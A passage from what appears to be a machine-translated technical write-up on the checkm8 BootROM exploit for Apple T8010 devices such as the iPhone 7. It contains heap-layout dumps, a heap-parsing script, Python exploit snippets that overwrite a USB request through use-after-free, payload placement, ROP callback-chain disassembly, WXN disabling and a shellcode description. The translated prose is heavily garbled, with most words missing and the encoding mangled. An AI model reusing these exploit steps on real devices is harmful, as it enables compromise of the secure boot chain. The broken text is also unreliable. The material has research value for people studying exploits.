%#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p>  <code>heap feng-shui</code> рдЪрд░рдг рдореЗрдВ 8 рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд╕рд╛рде рдХрд╛рд░реНрдпрдХреНрд░рдо рдЙрддреНрдкрд╛рджрди: </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p>  рдЕрдЧрд▓рд╛ <code>usb_device_io_request</code> рдкрд┐рдЫрд▓реЗ рдмрдлрд░ рдХреА рд╢реБрд░реБрдЖрдд рд╕реЗ рдСрдлрд╕реЗрдЯ <code>0x5c0</code> рдкрд░ рд╣реЛрдЧрд╛, рдЬреЛ рд╢реЛрд╖рдг рдХреЛрдб рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ: </p><br><pre> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p>       ,      <code>SecureRAM</code> ,      <code>checkm8</code> .     ,       .    ,    <code>usb_device_io_request</code>     ,       . </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): #    this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p>         . ,        . </p><br><div class="spoiler"> <b class="spoiler_title">    SecureRAM</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p>     ,    <code>High Speed</code>  <code>Full Speed</code> ,     <code>IO</code> -.          , ,  ,      .      ,     . </p><br><h2 id="2-allokaciya-i-osvobozhdenie-io-bufera-bez-ochistki-globalnogo-sostoyaniya"> 2.    IO-     </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p>      <code>OUT</code> -   .      ,   <code>io_buffer</code>      .    <code>DFU</code>    <code>DFU_CLR_STATUS</code> ,      <code>DFU</code> . </p><br><h2 id="3-perezapis-usb_device_io_request-v-kuche-s-pomoschyu-use-after-free"> 3.  <code>usb_device_io_request</code>     <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p>      <code>usb_device_io_request</code>        <code>t8010_overwrite</code> ,       . </p><br><p>  <code>t8010_nop_gadget</code>  <code>0x1800B0800</code>    <code>callback</code>  <code>next</code>  <code>usb_device_io_request</code> . </p><br><p> <code>t8010_nop_gadget</code>      ,         ,       <code>LR</code> , -    <code>free</code>  <code>callback</code> -  <code>usb_core_complete_endpoint_io</code> .  ,        ,          . </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code>   <code>INSECURE_MEMORY + 0x800</code> .  <code>INSECURE_MEMORY</code>     ,    <code>0x800</code>     <code>callback-chain</code> ,     . </p><br><h2 id="4-razmeschenie-poleznoy-nagruzki"> 4.    </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p>            .      : </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode #  shell-code ... 0x1800B0180: t8010_handler #   usb- ... 0x1800B0400: 0x1000006a5 #     #  SecureROM (0x100000000 -&gt; 0x100000000) #        ... 0x1800B0600: 0x60000180000625 #     #  SecureRAM (0x180000000 -&gt; 0x180000000) #        0x1800B0608: 0x1800006a5 #     #    0x182000000  0x180000000 #           0x1800B0610: disabe_wxn_arm64 #    WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-ispolnenie-callback-chain"> 5.  <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>   <code>USB</code>     <code>usb_device_io_request</code>        .        ,       <code>callback</code> .       : </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18тЖСj bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48тЖСj bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p>  ,   <code>0x70</code>            .          <code>f(x)</code>   <code>f</code>  <code>x</code> . </p><br><p>      ,  <code>Unicorn Engine</code> .          <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p>      <code>iPhone 7</code>    . </p><br><h4 id="51-dc_civac-0x1800b0600"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p>        .    ,          . </p><br><h4 id="52-dmb"> 5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p>  ,      ,    .   ,            ,   . </p><br><h4 id="53-enter_critical_section"> 5.3. <code>enter_critical_section()</code> </h4><br><p>         . </p><br><h4 id="54-write_ttbr00x1800b0000"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p>      <code>TTBR0_EL1</code>  <code>0x1800B0000</code> .   <code>INSECURE MEMORY</code> ,     .    ,         : </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi"> 5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p>      ,          . </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64"> 5.6. <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p>   <code>WXN</code> (Write permission implies Execute-never),       <code>RW</code> .     <code>WXN</code>  -      . </p><br><h4 id="57-write_ttbr00x1800a0000"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p>      <code>TTBR0_EL1</code> .       <code>BootROM</code>    ,     <code>INSECURE_MEMORY</code>  . </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p>     . </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p>      . </p><br><h4 id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p>    <code>shellcode</code> . </p><br><p>  ,   <code>callback-chain</code> тАФ   <code>WXN</code>     <code>shellcode</code>  <code>RW</code> -. </p><br><h2 id="6-ispolnenie-shellcode"> 6.  <code>shellcode</code> </h2><br><p>  <code>shellcode</code>   <code>src/checkm8_arm64.S</code>   : </p><br><h4 id="61-perezapis-konfiguracionnyh-usb-deskriptorov">  6.1ред   <code>USB</code> - </h4><br><p>          <code>usb_core_hs_configuration_descriptor</code>  <code>usb_core_fs_configuration_descriptor</code> ,   .        .         <code>USB</code> -, <code>shellcode</code>  . </p><br><h4 id="62-izmenenie-usbserialnumber">  6.2ред  <code>USBSerialNumber</code> </h4><br><p>   -   ,     <code>" PWND:[checkm8]"</code> .     ,    . </p><br><h4 id="63-perezapis-ukazatelya-obrabotchika-usb-zaprosov-na-novyy">  6.3ред    <code>USB</code> -   </h4><br><p>     <code>USB</code> -       ,        . </p><br><h4 id="64-kopirovanie-obrabotchika-usb-zaprosov-v-trampoline-oblast-pamyati-0x1800afc00"> 6.4.   <code>USB</code> -  <code>TRAMPOLINE</code>   ( <code>0x1800AFC00</code> ) </h4><br><p>   <code>USB</code> -    <code>wValue</code>   <code>0xffff</code> ,    ,     .   ,         : <code>memcpy</code> , <code>memset</code>  <code>exec</code> (      ). </p><br><p>       . </p><br><h2 id="realizaciya-eksployta-na-bolee-nizkom-urovne-raboty-s-usb">         USB </h2><br><p>             <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="> Proof-of-Concept</a>  <code>checkm8</code>  <code>Arduino</code>  <code>Usb Host Shield</code> . PoC    <code>iPhone 7</code> ,         .   <code>iPhone 7</code>  <code>DFU</code>   <code>Usb Host Shield</code>       ,      <code>PWND:[checkm8]</code> ,       <code>USB</code> -         <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">ipwndfu</a> ( ,  -  ..).     ,       ,       <code>USB</code> -.      <a href="">USB_Host_Shield_2.0</a> .    , patch-    . </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="vmesto-zaklyucheniya">   </h2><br><p>       .    <code>checkm8</code>   . ,               .          jailbreak-. ,     jailbreak   <code>checkm8</code> тАФ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">checkra1n</a> .    ,  jailbreak       ( <code>A5</code>  <code>A11</code> )    <code>iOS</code> .      <code>iWatch</code> , <code>Apple TV</code>    . ,             . </p><br><p>  jailbreak,         Apple.   <code>checkm8</code>    verbose- <code>iOS</code> ,  